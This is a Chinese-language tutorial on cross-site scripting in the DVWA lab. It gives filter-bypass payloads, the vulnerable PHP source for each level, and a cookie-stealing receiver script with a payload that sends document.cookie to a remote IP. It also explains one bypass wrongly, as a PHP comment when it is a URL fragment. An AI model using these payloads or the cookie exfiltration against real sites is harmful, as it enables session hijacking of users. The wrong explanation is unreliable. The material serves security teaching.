    跨站脚本（Cross Site Scripting）攻击，没有对web前端的输入边界进行严格的过滤是SXX漏洞形成的主要原因
    攻击者可以通过构造脚本语句使得输入的内容被当作HTML的一部分来执行，当用户访问到该页面时，就会触发该恶意脚本，从而获取用户的敏感数据（比如cookie数据）
    XSS漏洞发生在web前端，主要对网站用户造成危害，并不会直接危害服务器后台数据

    XSS类型：

    • 反射型XSS：通过XSS漏洞改造带有攻击脚本的URL，发送给URL给目标，触发恶意脚本，一次性，所见即所得，一般出现在查询类页面
    • 储查询XSS：通过SXX漏洞将恶意脚本注入到服务器后台（数据库或文件中），访问到该页面触发恶意脚本，永久性，一般出现在留言板
    • DOM型XSS：DOM（Document Object Model）-based XSS漏洞是基于文档对象模型的一种漏洞，它是通过修改页面的DOM节点而形成的（DOM xss也是一种反射型）

    注意：反射型和储查型的区别是否存在服务器上，而DOM-xss是通过修改页面的DOM节点来形成的XSS

    XSS漏洞测试过程：

    1. 在目标站点上找到输入点，比如查询接口，留言板等
    2. 输入一个“唯一”字符，点击提交后，查看当前状态下的源码文件
    3. 通过搜索定位到唯一字符，结合唯一字符前后语法构造script，并合理对HTML标签进行闭合
    4. 提交构造的script，看是否可以成功执行

    开撸开撸

    我们使用alert()弹窗来检测是否存在此漏洞

    反射性XSS

    一般反射型

    low级别：
    直接构造一个经典的语句：<script>alert(1)</script>
    成功弹窗，接下来看看它的源码

    <?php
header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
?>

    可以看到处理的代码非常简单，直接将用户的输入拼接放入了pre标签对里，我们构造的script语句可以直接被浏览器解析出来

    medium级别：
    继续使用low级别的语句进行尝试，发现页面将script语句之间的alert(1)显示了出来，查看网页源码发现

    原来我们的<script>不见了，这就使得浏览器不能正常解析这个脚本语句了。肯定是后台将它替换了。这里很容易想到可以试试利用大小写来绕过，后台的匹配。
    那么我们构造语句：<sCriPt>alert(1)</script>
    发现此时又能弹窗了，说明我们成功的绕过了检测。
    我们来看看它后台的源码

    <?php
header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?>

    可以发现仍然是很简单的一些代码，这里利用了str_replace进行了字符串的替换，从源码可以很清楚的看到，将<script>标签替换成了空字符，相当于删除了它。
    我们可以看到，这里仅对这个标签进行了一次检查替换，那么我们可以尝试将<script>来重新构造一下,变为
    <scr<script>ipt>alert(1)</script>

    提交后发现也能弹窗，这是因为虽然<scr<script>ipt>中间的<script>被删除了，但剩下的部分又组成了<script>，这样也绕过了检测

    high级别：
    这时前面的方法都不行了，看看网页源码

    发现我们构造的语句只剩下一个>，我们构造的script语句被严格过滤了，这时我们就不能再使用<script>标签了
    我们可以尝试利用img标签，如下
    <img src=1 onerror=alert(‘xss’)>
    这时又能成功弹窗了，我们看看网页源码

    我们分析一下构造的语句，img标签是用来放图片的src后面接图片的地址，onerror后面接发生错误时执行的语句，这里很显然1这个地址没有图片，引发错误，接着执行了alert语句
    继续查看后台源码

    <?php
header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?>

    可以看到这里使用了正则表达式对我们传入的参数进行匹配过滤，但只是针对<script>做过滤

    DOM型

    DOM是W3C标准，可以把DOM认为是页面上数据和结构的一个树形表示

    一些关于DOM的知识补充：
    可能触发DOM型XSS的属性：document.referer属性、window.name属性、location属性、innerHTML属性、documen.write属性

    document 和 windows 对象：
    document表示的是一个文档对象，window表示的是一个窗口对象，一个窗口下可以有多个文档对象。
    所以一个窗口下只有一个window.location.href，但是可能有多个document.URL、document.location.href

    window 对象

    • 它是一个顶层对象,而不是另一个对象的属性即浏览器的窗口。
    • window.location 包含 href 属性，直接取值赋值时相当于 window.location.href
    • window.location.href 当前页面完整 URL

    document 对象

    • 该对象是window和frames对象的一个属性,是显示于窗口或框架内的一个文档。
    • document 只是属于window 的一个子对像。
    • document.location 包含 href 属性，直接取值赋值时相当于 document.location.href
    • document.location.href 当前页面完整 URL

    document.URL 取值时等价于 window.location.href 或 document.location.href。在某些浏览器中通过对 document.URL 赋值来实现页面跳转，但某些浏览器中不行。

    document.write：
    ocument.write是JavaScript中对document.open所开启的文档流(document stream操作的API方法，它能够直接在文档流中写入字符串，一旦文档流已经关闭，那document.write就会重新利用document.open打开新的文档流并写入，此时原来的文档流会被清空，已渲染好的页面就会被清除，浏览器将重新构建DOM并渲染新的页面

    这些DOM知识参考自https://www.jianshu.com/p/001daa7cf1f5

    low级别：
    是一个选项框，先随便选一个，然后提交，提交后好像并没有什么变化，看看网页源码

    可以看到，这里先利用document.location.href获取当前页面完整的url再使用indexOf函数来获取default=首次出现的位置加上8（indexOf返回的是default=这个字符的首个字符在整个url字符串里的位置，8是default=这个字符串的长度）之后的位置，利用substring函数从这个位置开始截取后面的字符串，也就是说获取default=后的值。并将其赋值给lang这个变量
    下一句是往当前页面写入这个值，decodeURL函数对经过url编码后的变量进行解码
    我们可以构造如下url
    xxx/?default=<script>alert(1)</script>
    成功弹窗，打开后台源码发现没有任何处理

    medium级别：
    网页的源码没区别，看看后台源码

    <?php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}
?>

    这里关键的地方就在stripos($default, "<script")这个函数，当我们提交的内容含有<script这个字符串时，就会执行下面那条语句，直接将url替换成?default=English，并且stripos对大小写不敏感
    这样我们，就不能用大写字母或双写绕过，那么我们可以构造一下url
    xxx/?default=</select><img src=1 onerror=alert(1)>
    成功弹窗，</select>是用来闭合select标签的

    high级别：
    这里肯定也是后台进行了一些处理

    <?php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}
?>

    这里对我们的输入进行了判断，如果请求的值不是选项里的内容，就会自动选择English
    经过分析发现，这里仅对内容进行简单的判断，我们可以利用php里的注释符来绕过，构造如下url
    xxx/?default=French#<script>alert(1)</script>
    可以弹窗，这里后台将值代入匹配判断时，#后的字符串被当成注释了，所以能通过检测

    通过XSS获取COOKIE

    后台接收cookie的脚本

    <?php
$cookie = $_GET['cookie'];//以GET方式获取cookie变量值
$time = date('Y-m-d g:i:s');//以年-月-日时：分：秒的格式显示时间
$referer = getenv('HTTP_REFERER');//获取referer
$cookietxt = fopen('cookie.txt','a');//打开cookie.txt，若不存在则创建它
fwrite($cookietxt,'time:'.$time.' '.'cookie:'.$cookie.' '.'referer:'.$referer."\n");//写入文件
fclose($cookietxt);//关闭文件
?>

    payload:<script>document.write('<img src="http://192.168.3.85/xss/index.php?cookie='+document.cookie+'" width=0 height=0 border=0>')</script>
    这里的消息框也有内容长度的限制，不过是前端的改一下就好了


    已经可以坐等cookie了

    XSS防范措施

    • 对前端输入做过滤和编码
      • 比如输入指定类型的字符，输入检查再服务端完成，对特殊字符进行过滤和转义
    • 对输出做过滤和编码：再变量值输出到前端的HTML时进行编码或转义
    • 给关键的cookie使用http-only
